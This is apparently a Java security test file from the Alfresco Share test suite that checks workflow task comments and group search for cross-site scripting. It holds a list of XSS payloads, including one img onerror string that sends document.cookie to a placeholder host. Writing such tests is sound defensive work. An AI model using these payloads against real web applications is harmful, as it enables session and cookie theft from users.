package org.alfresco.share.security;

import java.util.Date;

import org.alfresco.dataprep.CMISUtil.Priority;
import org.alfresco.dataprep.DashboardCustomization.DashletLayout;
import org.alfresco.dataprep.DashboardCustomization.UserDashlet;
import org.alfresco.dataprep.SiteService.Visibility;
import org.alfresco.dataprep.WorkflowService;
import org.alfresco.po.enums.DashletHelpIcon;
import org.alfresco.po.share.dashlet.Dashlet;
import org.alfresco.po.share.dashlet.MyTasksDashlet;
import org.alfresco.po.share.site.SelectPopUpPage;
import org.alfresco.po.share.tasksAndWorkflows.EditTaskPage;
import org.alfresco.po.share.tasksAndWorkflows.StartWorkflowPage;
import org.alfresco.po.share.tasksAndWorkflows.TaskDetailsPage;
import org.alfresco.po.share.tasksAndWorkflows.WorkflowDetailsPage;
import org.alfresco.po.share.tasksAndWorkflows.WorkflowsIveStartedPage;
import org.alfresco.po.share.user.UserDashboardPage;
import org.alfresco.po.share.user.profile.UserProfilePage;
import org.alfresco.share.ContextAwareWebTest;
import org.alfresco.testrail.TestRail;
import org.alfresco.utility.data.RandomData;
import org.alfresco.utility.model.TestGroup;
import org.springframework.beans.factory.annotation.Autowired;
import org.testng.Assert;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;

/**
 * @author andrei.ciubotaru
 */
public class WorkflowSecurityTests extends ContextAwareWebTest
{
    private final Date timeDate = new Date();
    private final String taskMessage = "PRR Task";
    private final String[] xssStrings = new String[] {
        "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">",
        "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">",
        "<DIV STYLE=\"width: expression(alert('XSS'));\">",
        "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
        "<img><scrip<script>t>alert('XSS');<</script>/script>",
        "<input onfocus=write(1) autofocus>",
        "<input onblur=write(1) autofocus><input autofocus>",
        "<body oninput=alert(1)><input autofocus>",
        "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
        "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X"
    };
    @Autowired
    WorkflowService workflowService;
    //@Autowired
    EditTaskPage editTaskPage;
    //@Autowired
    MyTasksDashlet myTasksDashlet;
    //@Autowired
    TaskDetailsPage taskDetailsPage;
    //@Autowired
    UserProfilePage userProfilePage;
    //@Autowired
    StartWorkflowPage startWorkflowPage;
    //@Autowired
    SelectPopUpPage selectPopUpPage;
    //@Autowired
    WorkflowsIveStartedPage workflowsIveStartedPage;
    //@Autowired
    WorkflowDetailsPage workflowDetailsPage;
    String testUser = String.format("testUser%s", RandomData.getRandomAlphanumeric());
    String testUser2 = String.format("testUser2%s", RandomData.getRandomAlphanumeric());
    String testSite = String.format("testSite%s", RandomData.getRandomAlphanumeric());

    @BeforeClass (alwaysRun = true)
    public void setupTest()
    {
        userService.create(adminUser, adminPassword, testUser, password, "alfresco@domain.com", "FirstName1", "LastName1");
        userService.create(adminUser, adminPassword, testUser2, password, "alfresco@domain.com", "FirstName2", "LastName2");
        siteService.create(testUser, password, null, testSite, "Test Site", Visibility.PUBLIC);
    }

    @AfterClass (alwaysRun = true)
    public void afterClass()
    {
        cleanupAuthenticatedSession();
        userService.delete(adminUser, adminPassword, testUser);
        userService.delete(adminUser, adminPassword, testUser2);
    }

    @TestRail (id = "C286553")
    @Test (groups = { TestGroup.SANITY, TestGroup.SECURITY, "tobefixed", "xsstests" })
    public void verifyEditTaskButtonSaveAndClose()
    {
        LOG.info("Precondition 3: Create a \"New Task\" with message, due date, assign it to yourself, uncheck \"Send Email Notifications");
        workflowService.startNewTask(testUser, password, taskMessage, timeDate, testUser, Priority.Normal, null, null, false);
        LOG.info("Precondition 2: Add \"My Task\" dashlet to user dashboard if the dashlet is not present");
        setupAuthenticatedSession(testUser, password);
        addMyTaskDashletToDashboard(testUser);

        for (String xssString : xssStrings)
        {
            LOG.info("STEP1: Click \"Edit Task\" icon for created task on the \"My Tasks\" dashlet;");
            myTasksDashlet.editTask(taskMessage);
            Assert.assertEquals(editTaskPage.getMessage(), taskMessage, "Edit Task page is not opened");
            LOG.info("STEP2: Into Your \"Response\" - \"Comment\" enter each XSS attack from the list. XSS attack: " + xssString);
            editTaskPage.writeComment(xssString);
            LOG.info("STEP3: Click \"Save and Close\" button");
            //editTaskPage.clickOnSaveButton(userDashboardPage);
            Assert.assertTrue(myTasksDashlet.isTaskPresent(taskMessage), "Task is not present in \"My task\" dashlet");
            myTasksDashlet.viewTask(taskMessage);
            Assert.assertEquals(taskDetailsPage.getComment(), xssString, "Comment was not saved.");
            userDashboard.navigate(testUser);
        }
    }

    @TestRail (id = "C286584")
    @Test (groups = { TestGroup.SANITY, TestGroup.SECURITY, "xsstests" })
    public void findGroupWithXSSPooledTask()
    {
        setupAuthenticatedSession(testUser, password);
        LOG.info("PRECONDITION2: Open \"Start Workflow\" page");
        startWorkflowPage.navigate(testSite);
        LOG.info("PRECONDITION3: Select \"Review and Approve (pooled review)\" from \"Workflow:\" drop-down");
        startWorkflowPage.selectAWorkflow("Review and Approve (pooled review)");

        LOG.info("STEP1: Click Select button in Assignee part;");
        startWorkflowPage.clickGroupSelectButton();

        for (String xssString : xssStrings)
        {
            LOG.info("STEP2: Fill Search field with each XSS attack: " + xssString);
            LOG.info("STEP3: Click \"Search button\"");
            selectPopUpPage.search(xssString);

            Assert.assertTrue(selectPopUpPage.isSearchButtonDisplayed(), "Search button is no longer displayed. XSS attack succeeded");

        }
        LOG.info("STEP4:Fill Search field with a existent group name and click \"Search button\"");
        selectPopUpPage.search("EMAIL_CONTRIBUTORS");
        Assert.assertTrue(selectPopUpPage.isStringPresentInSearchList("EMAIL_CONTRIBUTORS"), "Group is not present in the search list");

    }

    @TestRail (id = "C286704")
    @Test (groups = { TestGroup.SANITY, TestGroup.SECURITY, "tobefixed", "xsstests" })
    public void verifyEditTaskButtonReject()
    {
        LOG.info("Precondition 2: Add \"My Task\" dashlet to user dashboard if the dashlet is not present\n");
        setupAuthenticatedSession(testUser, password);
        addMyTaskDashletToDashboard(testUser);

        LOG.info("Precondition 3: Create as many \"Review and Approve (Single reviewer)\" workflows as the number of XSS attack you have, with message, due date, assign them to user2, uncheck \"Send Email Notifications\"\n");
        for (int i = 0; i < xssStrings.length; i++)
        {
            workflowService.startSingleReview(testUser, password, taskMessage + i, timeDate, testUser2, Priority.Normal, null, null, false);
        }

        LOG.info("Precondition 4: Login with user2.");
        setupAuthenticatedSession(testUser2, password);

        for (int i = 0; i < xssStrings.length; i++)
        {

            LOG.info("STEP 1: Click \"Edit Task\" icon for the created task on the \"My Tasks\" dashlet;");
            myTasksDashlet.editTask(taskMessage + i);
            Assert.assertEquals(editTaskPage.getMessage(), taskMessage + i, "Task message is not equal with the actual message or \"Edit Task\" page in not opened");

            LOG.info("STEP 2: Into Your \"Response\" - \"Comment\" enter each XSS attack from the list");
            editTaskPage.writeComment(xssStrings[i]);
            Assert.assertTrue(editTaskPage.isReassignButtonPresent(), "The element cannot be found. XSS attack has occured.");


            LOG.info("STEP 3: Click Reject button;");
            editTaskPage.clickRejectButton();
            Assert.assertTrue(userDashboard.isNewAlfrescoLogoDisplayed(), "The User Dashboard page is not opened");

        }

        LOG.info("STEP 4: Log is as assigner: " + testUser);
        setupAuthenticatedSession(testUser, password);
        workflowsIveStartedPage.navigate();
        for (int i = 0; i < xssStrings.length; i++)
        {
            LOG.info("STEP 5: Open Workflow details page; Task name: " + taskMessage + i);
            workflowsIveStartedPage.clickOnWorkflowTitle(taskMessage + i);
            Assert.assertEquals(workflowDetailsPage.getRecentComment(), xssStrings[i], "XSS string is not displayed in outcome");

            LOG.info("STEP 6: Open Edit task page");
            workflowDetailsPage.clickEditTaskButton();
            Assert.assertTrue(editTaskPage.getEditTaskHeader().contains("Rejected"), "Edit Task page is not opened");

            LOG.info("STEP 7: Click Task Done button;");
            editTaskPage.clickTaskDoneButton();
            Assert.assertEquals(workflowDetailsPage.getRecentOutcome(), "Task Done", "Workflow Details page is not opened");

            workflowsIveStartedPage.navigate();
        }


    }


    /**
     * If 'MyTask' dashlet is not displayed on user dashboard add it.
     * And then check if it was successfully added.
     */

    private void addMyTaskDashletToDashboard(String testUser)
    {
        if (!myTasksDashlet.isDashletDisplayed(DashletHelpIcon.MY_TASKS))
        {
            userService.addDashlet(testUser, password, UserDashlet.MY_TASKS, DashletLayout.THREE_COLUMNS, 2, 2);
        }
        Assert.assertEquals(myTasksDashlet.getDashletTitle(), "My Tasks", "'My Tasks' dashlet is not displayed in user's dashboard.");
    }
}
